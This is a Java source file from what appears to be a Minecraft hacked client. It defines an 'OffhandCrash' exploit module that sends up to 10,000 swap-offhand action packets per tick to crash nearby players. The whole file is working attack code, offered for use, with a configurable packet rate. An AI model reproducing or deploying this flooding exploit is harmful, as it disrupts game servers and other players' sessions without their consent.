/*
 * This file is part of the atomic client distribution.
 * Copyright (c) 2021-2021 0x150.
 */

package me.x150.sipprivate.feature.module.impl;

import me.x150.sipprivate.CoffeeClientMain;
import me.x150.sipprivate.feature.config.DoubleSetting;
import me.x150.sipprivate.feature.module.Module;
import me.x150.sipprivate.feature.module.ModuleRegistry;
import me.x150.sipprivate.feature.module.ModuleType;
import me.x150.sipprivate.helper.util.Utils;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {

    DoubleSetting a = this.config.create(new DoubleSetting.Builder(500).precision(0).name("Amount").description("How many crash packets to send per tick").min(10).max(10000).get());

    public OffhandCrash() {
        super("OffhandCrash", "Crashes players around with sound packets", ModuleType.EXPLOIT);
    }

    @Override public void tick() {
        try {
            if (CoffeeClientMain.client.player == null || CoffeeClientMain.client.getNetworkHandler() == null) {
                throw new Exception();
            }
            PlayerActionC2SPacket p = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
            for (int i = 0; i < a.getValue(); i++) {
                CoffeeClientMain.client.getNetworkHandler().sendPacket(p);
            }
        } catch (Exception ignored) {
            this.setEnabled(false);
        }
    }

    @Override public void enable() {
        if (!ModuleRegistry.getByClass(AntiOffhandCrash.class).isEnabled()) {
            Utils.Logging.messageChat("I would recommend you turn on AntiOffhandCrash before using this");
            setEnabled(false);
        }
    }

    @Override public void disable() {

    }

    @Override public String getContext() {
        return (a.getValue() * 20) + "";
    }

    @Override public void onWorldRender(MatrixStack matrices) {

    }

    @Override public void onHudRender() {

    }
}

